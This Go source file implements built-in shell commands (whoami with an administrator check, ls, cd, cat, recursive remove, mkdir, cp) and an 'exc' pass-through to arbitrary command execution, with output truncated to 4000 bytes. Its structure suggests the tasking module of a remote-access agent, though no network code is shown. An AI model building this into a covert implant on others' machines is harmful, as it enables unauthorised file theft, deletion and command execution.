package command

import (
	"fmt"
	"io"
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

const maxCommandOutputBytes = 4000

var currentDir = ""

func init() {
	var err error
	currentDir, err = os.Getwd()
	if err != nil {
		currentDir = "C:\\"
	}
}

func ExecuteBuiltin(cmdStr string) (string, bool) {
	parts := strings.Fields(cmdStr)
	if len(parts) == 0 {
		return "", false
	}

	cmd := strings.ToLower(parts[0])

	var (
		output  string
		handled bool
	)

	switch cmd {
	case "whoami":
		output, handled = builtinWhoami()
	case "ls":
		output, handled = builtinLs(parts)
	case "pwd":
		output, handled = builtinPwd()
	case "cd":
		output, handled = builtinCd(parts)
	case "cat":
		output, handled = builtinCat(parts)
	case "remove":
		output, handled = builtinRemove(parts)
	case "mkdir":
		output, handled = builtinMkdir(parts)
	case "cp":
		output, handled = builtinCp(parts)
	case "exc":
		output, handled = builtinExc(parts)
	default:
		return "", false
	}

	if !handled {
		return output, false
	}

	return limitCommandOutput(output), true
}

func limitCommandOutput(output string) string {
	data := []byte(output)

	if len(data) <= maxCommandOutputBytes {
		return output
	}

	keepBytes := maxCommandOutputBytes

	for {
		ignoredBytes := len(data) - keepBytes
		warning := fmt.Sprintf("\n[!] %d bytes ignored...", ignoredBytes)

		newKeepBytes := maxCommandOutputBytes - len([]byte(warning))
		if newKeepBytes < 0 {
			newKeepBytes = 0
		}

		if newKeepBytes == keepBytes {
			return string(data[:keepBytes]) + warning
		}

		keepBytes = newKeepBytes
	}
}

func builtinWhoami() (string, bool) {
	u, err := user.Current()
	if err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}

	groups, err := u.GroupIds()
	if err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}

	isAdmin := false
	for _, gid := range groups {
		if gid == "544" {
			isAdmin = true
			break
		}
	}

	priv := "User"
	if isAdmin {
		priv = "Administrator"
	}

	output := fmt.Sprintf(
		"User: %s\nSID: %s\nPrivileges: %s",
		u.Username,
		u.Uid,
		priv,
	)

	return output, true
}

func builtinLs(parts []string) (string, bool) {
	dir := currentDir
	if len(parts) > 1 {
		dir = parts[1]
		if !filepath.IsAbs(dir) {
			dir = filepath.Join(currentDir, dir)
		}
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}

	var output strings.Builder

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		prefix := " "
		if entry.IsDir() {
			prefix = "D"
		}

		output.WriteString(fmt.Sprintf(
			"[%s] %s %12d  %s\n",
			prefix,
			info.ModTime().Format("2006-01-02 15:04:05"),
			info.Size(),
			entry.Name(),
		))
	}

	return strings.TrimSpace(output.String()), true
}

func builtinPwd() (string, bool) {
	return currentDir, true
}

func builtinCd(parts []string) (string, bool) {
	if len(parts) < 2 {
		return currentDir, true
	}

	target := parts[1]
	if !filepath.IsAbs(target) {
		target = filepath.Join(currentDir, target)
	}

	info, err := os.Stat(target)
	if err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}

	if !info.IsDir() {
		return fmt.Sprintf("Error: %s is not a directory", target), true
	}

	abs, err := filepath.Abs(target)
	if err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}

	currentDir = abs
	return currentDir, true
}

func builtinCat(parts []string) (string, bool) {
	if len(parts) < 2 {
		return "Error: missing filename", true
	}

	path := parts[1]
	if !filepath.IsAbs(path) {
		path = filepath.Join(currentDir, path)
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}

	return string(content), true
}

func builtinRemove(parts []string) (string, bool) {
	if len(parts) < 2 {
		return "Error: missing path", true
	}

	path := parts[1]
	if !filepath.IsAbs(path) {
		path = filepath.Join(currentDir, path)
	}

	if err := os.RemoveAll(path); err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}

	return fmt.Sprintf("Deleted: %s", path), true
}

func builtinMkdir(parts []string) (string, bool) {
	if len(parts) < 2 {
		return "Error: missing directory name", true
	}

	path := parts[1]
	if !filepath.IsAbs(path) {
		path = filepath.Join(currentDir, path)
	}

	if err := os.MkdirAll(path, 0755); err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}

	return fmt.Sprintf("Created: %s", path), true
}

func builtinCp(parts []string) (string, bool) {
	if len(parts) < 3 {
		return "Error: usage: cp <source> <destination>", true
	}

	src := parts[1]
	if !filepath.IsAbs(src) {
		src = filepath.Join(currentDir, src)
	}

	dst := parts[2]
	if !filepath.IsAbs(dst) {
		dst = filepath.Join(currentDir, dst)
	}

	srcFile, err := os.Open(src)
	if err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}
	defer dstFile.Close()

	if _, err := io.Copy(dstFile, srcFile); err != nil {
		return fmt.Sprintf("Error: %v", err), true
	}

	return fmt.Sprintf("Copied: %s -> %s", src, dst), true
}

func builtinExc(parts []string) (string, bool) {
	if len(parts) < 2 {
		return "Error: usage: exc <command>", true
	}

	cmdStr := strings.Join(parts[1:], " ")
	result := ExecuteCommand(cmdStr)

	return result, true
}